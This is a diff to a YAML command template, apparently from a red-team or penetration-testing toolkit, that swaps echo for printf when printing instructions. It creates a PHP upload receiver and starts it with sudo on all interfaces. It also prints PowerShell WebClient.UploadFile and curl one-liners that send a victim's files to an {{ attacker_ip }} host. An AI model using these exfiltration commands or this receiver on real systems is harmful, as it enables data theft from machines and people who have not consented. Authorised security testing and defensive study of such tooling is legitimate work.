@@ -7,13 +7,13 @@ metadata:
 
 content: |
   mkdir -p packstation/inbound/wwwroot; cp -n {{ templates_dir }}/helper_scripts/upload.php packstation/inbound/wwwroot; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Upload data (absolute paths only): (New-Object System.Net.WebClient).UploadFile(\'http://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload.php\',\'FILE\')'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo '================================================================'; \
-  echo '                         ----Linux----                          '; \
-  echo 'Upload data: curl -v http://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload.php -F "file=@FILE"'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' "Upload data (absolute paths only): (New-Object System.Net.WebClient).UploadFile('http://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload.php','FILE')"; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                         -----CMD-----                          '; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                         ----Linux----                          '; \
+  printf '%s\n' 'Upload data: curl -v http://{{ attacker_ip }}:{{ delivery_inbound_port }}/upload.php -F "file=@FILE"'; \
+  printf '%s\n' '================================================================'; \
   sudo php -d post_max_size=0 -d memory_limit=-1 -d upload_max_filesize=10G -d max_execution_time=120 -S 0.0.0.0:{{ delivery_inbound_port }} -t packstation/inbound/wwwroot
